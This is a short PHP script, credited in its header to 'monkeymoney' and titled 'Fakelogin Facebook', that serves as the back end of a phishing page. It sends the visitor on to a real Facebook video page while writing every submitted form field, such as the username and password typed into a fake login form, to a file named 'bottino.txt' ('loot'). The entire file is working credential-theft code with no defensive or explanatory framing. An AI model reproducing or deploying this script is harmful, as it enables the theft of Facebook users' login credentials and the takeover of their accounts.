<?php

/*****************************
Autore : monkeymoney
Script : Fakelogin Facebook

*****************************/

header ('Location:https://m.facebook.com/story.php?story_fbid=1648285555268600&id=112905748806596&refsrc=https%3A%2F%2Fm.facebook.com%2Ffailarmy%2Fvideos%2F1648285555268600%2F&_rdr');
$handle = fopen("bottino.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?> 
